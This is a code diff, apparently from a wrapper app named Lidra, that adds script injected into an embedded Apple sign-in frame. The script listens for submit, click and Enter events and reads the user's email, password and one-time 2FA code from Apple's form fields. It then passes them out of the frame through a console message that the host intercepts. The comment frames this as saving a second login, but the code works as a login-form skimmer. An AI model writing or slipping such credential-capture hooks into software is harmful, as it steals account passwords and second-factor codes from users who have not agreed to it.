@@ -148,6 +148,73 @@
     }
   }
 
+
+  // ---- credential capture for the wrapper's one-time app sign-in -------------
+  // Lidra already holds this frame's password at the moment Apple receives it;
+  // forwarding it once saves the user a second identical login. Values leave the
+  // frame only as a console event that setupAuthFrameInjection() intercepts
+  // before any logging, and they are never written to disk.
+  if (!window.__lidraCredHook) {
+    window.__lidraCredHook = true;
+    const readField = (selectors) => {
+      for (const selector of selectors) {
+        const el = document.querySelector(selector);
+        if (el && typeof el.value === 'string' && el.value) return el.value;
+      }
+      return '';
+    };
+    const readCreds = () => ({
+      email: readField([
+        'input[type="email"]',
+        'input[name="accountName"]',
+        'input[autocomplete="username"]',
+        'input#account_name_text_field',
+      ]),
+      password: readField([
+        'input[type="password"]',
+        'input[autocomplete="current-password"]',
+        'input#password_text_field',
+      ]),
+      code: readField([
+        'input[autocomplete="one-time-code"]',
+        'input[inputmode="numeric"]',
+        'input[name="code"]',
+        'input#char0',
+      ]),
+    });
+    const report = (kind, payload) => {
+      try {
+        console.info('[lidra] auth-' + kind + ':' + JSON.stringify(payload));
+      } catch (_) {
+        /* nothing to report to */
+      }
+    };
+    const capture = () => {
+      const value = readCreds();
+      if (value.password && value.email) report('creds', value);
+      else if (value.code) report('code', { code: value.code });
+    };
+    if (typeof document.addEventListener === 'function') {
+      document.addEventListener('submit', capture, true);
+      document.addEventListener(
+        'click',
+        (event) => {
+          const target = event.target;
+          if (!target || !target.closest) return;
+          if (target.closest('button[type="submit"], input[type="submit"], [role="button"]')) capture();
+        },
+        true,
+      );
+      document.addEventListener(
+        'keydown',
+        (event) => {
+          if (event.key === 'Enter') capture();
+        },
+        true,
+      );
+    }
+  }
+
   // Without a preload, the frame reports through console.
   // setupAuthFrameInjection() recognises the log prefix.
   const cssRuleCount = css.split('}').length - 1;
